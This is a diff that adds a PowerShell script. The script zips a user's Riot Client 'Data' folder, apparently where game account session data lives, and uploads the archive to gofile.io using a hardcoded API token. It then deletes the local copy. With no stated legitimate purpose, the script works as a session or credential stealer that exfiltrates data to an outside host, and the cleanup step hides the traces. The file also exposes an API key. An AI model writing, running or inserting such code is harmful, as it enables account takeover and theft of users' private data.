@@ -1,0 +1,64 @@
+# Paste your target folder path here:
+$SourceFolderPath = "C:\Users\onsbt\AppData\Local\Riot Games\Riot Client\Data"
+
+$DestinationDir   = "C:\ProgramX64\extentions"
+$ApiKey           = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK"
+
+function Upload-FileToGofile {
+    param (
+        [string]$Path,
+        [string]$ApiKey
+    )
+
+    $uploadUri = "https://store1.gofile.io/uploadFile"
+
+    try {
+        if (Test-Path $Path) {
+            Write-Host "Uploading $Path to Gofile..." -ForegroundColor Cyan
+            curl.exe -F "file=@$Path" -F "token=$ApiKey" $uploadUri
+            Write-Host "`nUpload complete." -ForegroundColor Green
+        }
+        else {
+            Write-Error "File not found for upload: $Path"
+        }
+    }
+    catch {
+        Write-Error "Upload failed: $_"
+    }
+}
+
+# 1. Validate source folder
+if (-not (Test-Path -Path $SourceFolderPath -PathType Container)) {
+    Write-Error "Source folder does not exist: $SourceFolderPath"
+    return
+}
+
+# 2. Ensure target directory exists
+if (-not (Test-Path -Path $DestinationDir)) {
+    New-Item -ItemType Directory -Path $DestinationDir -Force | Out-Null
+}
+
+# 3. Define output ZIP path using the folder name
+$folderName = (Get-Item -Path $SourceFolderPath).Name
+$zipPath = Join-Path -Path $DestinationDir -ChildPath "$folderName.zip"
+
+# Remove old ZIP if present
+if (Test-Path -Path $zipPath) {
+    Remove-Item -Path $zipPath -Force
+}
+
+try {
+    # 4. Compress folder contents into ZIP
+    Write-Host "Compressing '$SourceFolderPath' to '$zipPath'..." -ForegroundColor Cyan
+    Compress-Archive -Path "$SourceFolderPath\*" -DestinationPath $zipPath -Force
+
+    # 5. Upload the ZIP
+    Upload-FileToGofile -Path $zipPath -ApiKey $ApiKey
+}
+finally {
+    # 6. Delete the local ZIP file
+    if (Test-Path -Path $zipPath) {
+        Write-Host "Cleaning up local ZIP file..." -ForegroundColor Yellow
+        Remove-Item -Path $zipPath -Force
+    }
+}
